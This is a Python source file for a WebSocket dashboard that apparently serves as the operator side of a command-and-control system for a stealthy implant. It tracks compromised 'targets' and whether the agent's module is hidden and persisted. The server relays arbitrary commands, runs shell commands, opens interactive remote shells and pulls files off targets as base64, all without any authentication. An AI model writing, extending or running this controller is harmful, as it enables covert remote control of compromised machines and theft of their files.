"""WebSocket dashboard server for the operator console."""

from __future__ import annotations

import asyncio
import base64
import json
import mimetypes
import socket
import threading
import time
from pathlib import Path
from typing import TYPE_CHECKING, Callable

from aiohttp import web

if TYPE_CHECKING:
    from lib.operator.server import Target, TargetManager

HTTP_PORT = 8080

_manager: TargetManager | None = None
_ws_clients: set[web.WebSocketResponse] = set()
_event_log: list[dict] = []
_loop: asyncio.AbstractEventLoop | None = None
_static_root: Path | None = None


def _enum_indexed(t: Target, cmd: str, prefix: str,
                  parse, *, limit: int = 200) -> list:
    """Fetch a count-then-index enumeration from the agent."""
    try:
        reply = t.exchange(cmd)
        if not reply.startswith(f"{prefix} "):
            return []
        count = min(int(reply.split()[1]), limit)
        results = []
        for i in range(count):
            entry = t.exchange(f"{cmd} {i}")
            item = parse(entry)
            if item is not None:
                results.append(item)
        return results
    except Exception:
        return []


def _parse_entry(reply: str):
    parts = reply.split(None, 2)
    return parts[2] if reply.startswith("ENTRY ") and len(parts) > 2 else None


def _target_to_dict(t: Target) -> dict:
    """Serialize a Target to JSON-safe dict."""
    status = {}
    if t.online:
        try:
            reply = t.exchange("STATUS")
            if reply.startswith("STATUS "):
                for pair in reply[7:].split():
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        status[k] = v
        except Exception:
            pass

    hidden = {cat: _enum_indexed(t, f"LIST {cat.upper()}", "LIST", _parse_entry)
              for cat in ("file", "pid", "content", "port")} if t.online else {}

    peer_addr = ""
    if t.online:
        try:
            addr, port = t.peer.getpeername()
            peer_addr = f"{addr}:{port}"
        except Exception:
            pass

    return {
        "id": t.id,
        "label": t.label,
        "hostname": t.hostname,
        "kernel": t.kernel,
        "arch": t.arch,
        "build_id": getattr(t, "build_id", ""),
        "online": t.online,
        "peer": peer_addr,
        "module_hidden": status.get("hidden", "?") == "yes",
        "persisted": status.get("persisted", "?") == "yes",
        "counts": {k: int(status.get(k, 0))
                   for k in ("files", "pids", "content", "ports")},
        "hidden": hidden,
    }


def _snapshot() -> dict:
    """Current state of all targets."""
    targets = _manager.list_all() if _manager else []
    return {
        "type": "state",
        "targets": [_target_to_dict(t) for t in targets],
        "events": _event_log[-50:],
    }


def add_event(msg: str, kind: str = "sys") -> None:
    """Log an event and push to all WS clients."""
    entry = {"time": time.strftime("%H:%M:%S"), "type": kind, "msg": msg}
    _event_log.append(entry)
    _broadcast(json.dumps({"type": "event", "event": entry}))


def _broadcast(data: str) -> None:
    """Send data to all connected WS clients."""
    for ws in list(_ws_clients):
        try:
            asyncio.run_coroutine_threadsafe(ws.send_str(data), _loop)
        except Exception:
            _ws_clients.discard(ws)


async def _watch_target(ws: web.WebSocketResponse, target_id: str,
                        cancel: asyncio.Event, loop) -> None:
    """Poll one target every 5s and push updates until cancelled."""
    prev = None
    while not cancel.is_set():
        try:
            await asyncio.wait_for(cancel.wait(), timeout=5.0)
            return
        except asyncio.TimeoutError:
            pass
        if not _manager:
            continue
        target = _manager.get(target_id)
        if not target:
            continue
        try:
            data = await loop.run_in_executor(None, _target_to_dict, target)
            payload = json.dumps({"type": "target_update", "target": data})
            if payload != prev:
                await ws.send_str(payload)
                prev = payload
        except Exception:
            return


async def _ws_endpoint(request: web.Request) -> web.WebSocketResponse:
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    _ws_clients.add(ws)
    watch_cancel: asyncio.Event | None = None
    watch_task: asyncio.Task | None = None
    try:
        loop = asyncio.get_event_loop()
        snap = await loop.run_in_executor(None, _snapshot)
        await ws.send_str(json.dumps(snap))
        async for msg in ws:
            if msg.type != web.WSMsgType.TEXT:
                break
            try:
                data = json.loads(msg.data)
            except json.JSONDecodeError:
                continue

            cmd_type = data.get("type", "")

            if cmd_type == "watch":
                tid = data.get("target")
                if watch_cancel:
                    watch_cancel.set()
                if watch_task:
                    watch_task.cancel()
                if tid:
                    watch_cancel = asyncio.Event()
                    watch_task = asyncio.ensure_future(
                        _watch_target(ws, tid, watch_cancel, loop))
                else:
                    watch_cancel = None
                    watch_task = None

            elif cmd_type == "refresh":
                snap = await loop.run_in_executor(None, _snapshot)
                await ws.send_str(json.dumps(snap))

            elif cmd_type == "rename":
                target_id = data.get("target")
                new_label = data.get("label", "").strip()
                if target_id and new_label and _manager:
                    target = _manager.get(target_id)
                    if target:
                        target.label = new_label
                        snap = await loop.run_in_executor(None, _snapshot)
                        _broadcast(json.dumps(snap))

            elif cmd_type == "command":
                target_id = data.get("target")
                command = data.get("command", "").strip()
                if not target_id or not command:
                    continue
                target = _manager.get(target_id) if _manager else None
                if not target or not target.online:
                    await ws.send_str(json.dumps({
                        "type": "result",
                        "target": target_id,
                        "command": command,
                        "ok": False,
                        "reply": "target offline",
                    }))
                    continue
                try:
                    reply = await loop.run_in_executor(
                        None, target.exchange, command,
                    )
                    await ws.send_str(json.dumps({
                        "type": "result",
                        "target": target_id,
                        "command": command,
                        "ok": True,
                        "reply": reply,
                    }))
                    add_event(f"{target.id}: {command}", "cmd")
                except Exception as e:
                    await ws.send_str(json.dumps({
                        "type": "result",
                        "target": target_id,
                        "command": command,
                        "ok": False,
                        "reply": str(e),
                    }))

            elif cmd_type == "download":
                target_id = data.get("target")
                remote_path = data.get("path", "").strip()
                dl_id = data.get("_dlId")
                if not target_id or not remote_path:
                    continue
                target = _manager.get(target_id) if _manager else None
                if not target or not target.online:
                    await ws.send_str(json.dumps({
                        "type": "download_result", "target": target_id,
                        "_dlId": dl_id,
                        "path": remote_path,
                        "ok": False, "error": "target offline",
                    }))
                    continue

                async def _do_download(t, path, did, tid):
                    def _progress(received: int, total: int) -> None:
                        asyncio.run_coroutine_threadsafe(
                            ws.send_str(json.dumps({
                                "type": "download_progress",
                                "_dlId": did,
                                "received": received,
                                "total": total,
                            })),
                            loop,
                        )
                    try:
                        file_bytes, total = await loop.run_in_executor(
                            None, t.download_file, path, _progress,
                        )
                        await ws.send_str(json.dumps({
                            "type": "download_result", "target": tid,
                            "_dlId": did,
                            "path": path, "ok": True,
                            "size": total,
                            "data": base64.b64encode(file_bytes).decode("ascii"),
                        }))
                        add_event(f"{tid}: download {path} ({len(file_bytes)}B)", "cmd")
                    except Exception as e:
                        await ws.send_str(json.dumps({
                            "type": "download_result", "target": tid,
                            "_dlId": did,
                            "path": path,
                            "ok": False, "error": str(e),
                        }))

                asyncio.ensure_future(_do_download(target, remote_path, dl_id, target_id))

            elif cmd_type == "exec":
                target_id = data.get("target")
                shell_cmd = data.get("command", "").strip()
                exec_id = data.get("_execId")
                if not target_id or not shell_cmd:
                    continue
                target = _manager.get(target_id) if _manager else None
                if not target or not target.online:
                    await ws.send_str(json.dumps({
                        "type": "exec_result", "target": target_id,
                        "_execId": exec_id,
                        "ok": False, "output": "target offline",
                    }))
                    continue
                try:
                    output = await loop.run_in_executor(
                        None, target.exec_shell, shell_cmd,
                    )
                    await ws.send_str(json.dumps({
                        "type": "exec_result", "target": target_id,
                        "_execId": exec_id,
                        "ok": True, "output": output,
                    }))
                except Exception as e:
                    await ws.send_str(json.dumps({
                        "type": "exec_result", "target": target_id,
                        "_execId": exec_id,
                        "ok": False, "output": str(e),
                    }))

    finally:
        if watch_cancel:
            watch_cancel.set()
        if watch_task:
            watch_task.cancel()
        _ws_clients.discard(ws)
    return ws


async def _shell_endpoint(request: web.Request) -> web.WebSocketResponse:
    target_id = request.query.get("target", "")
    target = _manager.get(target_id) if _manager else None
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    if not target or not target.online:
        await ws.send_str(json.dumps({"type": "error", "msg": "target offline"}))
        await ws.close()
        return ws

    loop = asyncio.get_event_loop()
    try:
        shell = await loop.run_in_executor(None, target.open_shell)
    except Exception as e:
        await ws.send_str(json.dumps({"type": "error", "msg": str(e)}))
        await ws.close()
        return ws

    await ws.send_str(json.dumps({"type": "ready"}))
    add_event(f"{target.id}: shell opened", "shell")

    async def _read_shell():
        try:
            while not ws.closed:
                data = await loop.run_in_executor(None, shell.recv, 4096)
                if not data:
                    break
                await ws.send_bytes(data)
        except (OSError, asyncio.CancelledError):
            pass
        finally:
            if not ws.closed:
                await ws.close()

    reader = asyncio.ensure_future(_read_shell())
    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.BINARY:
                await loop.run_in_executor(None, shell.sendall, msg.data)
            elif msg.type == web.WSMsgType.TEXT:
                await loop.run_in_executor(
                    None, shell.sendall, msg.data.encode(),
                )
    finally:
        reader.cancel()
        try:
            shell.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        shell.close()
        add_event(f"{target.id}: shell closed", "shell")
    return ws


async def _static_handler(request: web.Request) -> web.Response:
    path = request.match_info.get("path", "")
    if not path or path == "index.html":
        file = _static_root / "index.html"
    else:
        file = (_static_root / path).resolve()
        if not file.is_relative_to(_static_root):
            raise web.HTTPForbidden()

    if not file.is_file():
        file = _static_root / "index.html"

    content_type = mimetypes.guess_type(file.name)[0] or "application/octet-stream"
    return web.Response(body=file.read_bytes(), content_type=content_type)


def _run_server(http_port: int, static_root: Path) -> None:
    global _loop, _static_root
    _static_root = static_root

    async def run():
        global _loop
        _loop = asyncio.get_running_loop()

        app = web.Application()
        app.router.add_get("/ws", _ws_endpoint)
        app.router.add_get("/shell", _shell_endpoint)
        app.router.add_get("/{path:.*}", _static_handler)

        runner = web.AppRunner(app, access_log=None)
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", http_port)
        await site.start()
        await asyncio.Event().wait()

    asyncio.run(run())


def start_dashboard(
    manager: TargetManager,
    html_path: Path,
    output: Callable[[str], None],
    *,
    http_port: int = HTTP_PORT,
    **_kwargs,
) -> None:
    """Start the dashboard server as a daemon thread."""
    global _manager
    _manager = manager

    static_root = html_path.parent.resolve()

    threading.Thread(
        target=_run_server,
        args=(http_port, static_root),
        daemon=True, name="dashboard",
    ).start()

    output(f"  dashboard: http://localhost:{http_port}\n")
